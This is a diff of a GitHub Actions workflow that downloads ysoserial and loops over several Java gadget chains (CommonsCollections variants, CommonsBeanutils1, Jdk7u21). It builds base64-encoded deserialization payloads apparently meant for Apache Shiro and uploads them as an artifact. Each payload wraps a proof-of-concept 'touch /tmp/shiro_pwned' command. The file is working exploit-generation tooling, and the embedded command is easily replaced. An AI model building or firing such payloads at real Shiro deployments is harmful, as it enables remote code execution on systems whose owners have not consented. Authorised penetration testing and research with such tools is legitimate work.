@@ -1,4 +1,4 @@
-name: Generate Shiro Payload v3
+name: Generate Shiro Payloads (Multiple Gadgets)
 
 on:
   workflow_dispatch:
@@ -12,7 +12,7 @@ jobs:
           curl -L -o ysoserial-all.jar https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
           ls -lh ysoserial-all.jar
 
-      - name: Generate payload (with Java module opens)
+      - name: Generate payloads
         run: |
           JAVA_OPTS="--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED"
           JAVA_OPTS="$JAVA_OPTS --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED"
@@ -21,16 +21,30 @@ jobs:
           JAVA_OPTS="$JAVA_OPTS --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED"
           JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.io=ALL-UNNAMED"
           JAVA_OPTS="$JAVA_OPTS --add-opens java.desktop/com.sun.beans=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.lang.reflect=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/sun.reflect.misc=ALL-UNNAMED"
           
-          java $JAVA_OPTS -jar ysoserial-all.jar CommonsCollections4 "touch /tmp/shiro_pwned_gh" > payload.bin
-          echo "Payload size: $(wc -c < payload.bin) bytes"
-          base64 -w0 payload.bin > payload.b64
-          echo "Base64: $(head -c 50 payload.b64)... ($(wc -c < payload.b64) chars)"
-          echo "SHA256: $(sha256sum payload.bin | cut -d' ' -f1)"
+          mkdir payloads
+          CMD="touch /tmp/shiro_pwned"
+          
+          # Java 7 compatible gadgets
+          for gadget in CommonsCollections5 CommonsCollections6 CommonsBeanutils1 CommonsCollections1 Jdk7u21; do
+            echo "=== $gadget ==="
+            if java $JAVA_OPTS -jar ysoserial-all.jar $gadget "$CMD" > payloads/$gadget.bin 2>/dev/null; then
+              size=$(wc -c < payloads/$gadget.bin)
+              base64 -w0 payloads/$gadget.bin > payloads/$gadget.b64
+              echo "  OK: ${size} bytes"
+            else
+              echo "  FAILED"
+            fi
+          done
+          
+          echo "=== Summary ==="
+          ls -la payloads/
 
-      - name: Upload payload
+      - name: Upload payloads
         uses: actions/upload-artifact@v4
         with:
-          name: shiro-payload
-          path: payload.b64
+          name: shiro-payloads
+          path: payloads/
           retention-days: 1
